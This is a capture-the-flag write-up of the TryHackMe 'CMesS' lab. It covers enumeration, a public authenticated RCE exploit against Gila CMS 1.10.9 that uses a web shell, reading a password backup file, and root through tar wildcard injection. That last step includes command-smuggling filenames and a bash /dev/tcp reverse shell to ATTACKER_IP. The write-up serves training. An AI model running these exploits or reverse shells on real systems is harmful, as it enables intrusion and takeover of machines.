## Introduction
This is a medium challenge box on
[TryHackMe](https://tryhackme.com/r/room/cmess){:target="_blank"}{:rel="noopener noreferrer"}
> This is what a hint will look like!

When the IP is available, we'll need to add it to
`/etc/hosts`

```
VICTIM_IP cmess.thm
```

## Enumeration
### Ports
Let's start off with a port scan to see what services 
are available

```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```

![scan1](/images/cmess/cmess-scan1.png)

![scan2](/images/cmess/cmess-scan2.png)

We have two ports open
- 22: SSH
- 80: HTTP

### Subdirectories
It's usually a good idea to have run some enumeration in the background while you're working on something else. Maybe we can find some interesting web pages which will be useful later

```bash
dirsearch -w /usr/share/wordlists/dirb/big.txt -r --threads=100 --url=http://cmess.thm --output=dirsearch.txt
```

![dirsearch](/images/cmess/cmess-dirsearch.png)
There are a lot of directories available but for now let's take note of
`/admin`. It leads to a login page but we don't have any credentials yet.

### Subdomains
Since we're given a domain from the jump let's also check for subdomains

```bash
wfuzz -c --hc 302 -t 50 -u http://cmess.thm -H 'Host: FUZZ.cmess.thm' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hw 290
```

![subdomains](/images/cmess/cmess-subdomains.png)

Add this new subdomain to `/etc/hosts`  to make it accessible. It should look like this

```
VICTIM_IP cmess.thm dev.cmess.thm
```

Now we can visit the page

![dev](/images/cmess/cmess-dev.png)

It's a development message log and we've found credentials for andre!

### Dashboard
At this point we have a login page and credentials so let's see what else we can find by logging in

![login](/images/cmess/cmess-login.png)

![admin](/images/cmess/cmess-admin.png)

We have a version number! Let's see if there's something we can do with this

## Initial Foothold
> Are there any public exploits for Gila CMS version 1.10.9?

```bash
searchsploit gila 1.10.9
```

![searchsploit](/images/cmess/cmess-searchsploit.png)

Remote code execution that requires authentication! We fulfill those requirements so let's pull the code and inspect the source

```bash
searchsploit -m 51569
cat 51569.py
```

![exploit-source](/images/cmess/cmess-exploit-source.png)

So this code uploads a php web shell and then executes a bash reverse shell! We'll need to setup a listener to accept the reverse shell. We can do that with

```bash
nc -lvnp 4444
```

Now we can run the exploit with andre's credentials

```bash
python3 51569.py
```

![rce](/images/cmess/cmess-rce.png)

![www-data](/images/cmess/cmess-www-data.png)

We have a shell! Since python3 is on the box let's upgrade and stabilize our shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

## Horizontal Escalation
> Are there any interesting credential or backup files?

We can search the filesystem for backup files which use the
`bak` extension using this command

```bash
find / -type f -name "*bak*" -ls 2>/dev/null
```

![bak](/images/cmess/cmess-bak.png)

Running 
[linpeas](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md){:target="_blank"}{:rel="noopener noreferrer"}
also finds this file in the `Backup Files` and
`Password Files`sections, but it can easily be overlooked if you aren't reading carefully

![linpeas-bak](/images/cmess/cmess-linpeas-bak.png)

![linpeas-pw](/images/cmess/cmess-linpeas-pw.png)

Let's read the file and escalate our privileges

```bash
cat /opt/.password.bak
```

![user-flag](/images/cmess/cmess-user-flag.png)

## Root
> Are there any processes run as root on a schedule?

By checking `/etc/crontab` we can see a list of scheduled commands and what privileges they run with

```bash
cat /etc/crontab
```

![crontab](/images/cmess/cmess-crontab.png)

So [every 2 minutes](https://crontab.cronhub.io){:target="_blank"}{:rel="noopener noreferrer"}
root will backup everything in andre's backup directory using a tar wildcard.

> Can wildcards be abused when run with tar?

They can! This is known as 
[wildcard injection](https://www.exploit-db.com/papers/33930){:target="_blank"}{:rel="noopener noreferrer"}. 
By using a filename with the same format as a command flag, we can enable that command option! By only using command flags, we can 
[execute arbitrary commands using tar](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar){:target="_blank"}{:rel="noopener noreferrer"}.
Let's set up some files which will give us a reverse shell as root

```bash
cd /home/andre/backup
echo 'asdf' > '--checkpoint=1'
echo 'asdf' > '--checkpoint-action=exec=sh shell.sh'
echo "bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" > shell.sh
```

Now we wait with a listener on our machine

```bash
nc -lvnp 4444
```

![root](/images/cmess/cmess-root.png)

## Recap
Subdomain and subdirectory enumeration revealed an admin login page and credentials to use. A public exploit for GilaCMS v1.10.9 leads to an initial foothold into the system. A hidden password backup file escalates our privileges to another user. A cron job is vulnerable to tar wildcard injection which gives us root.
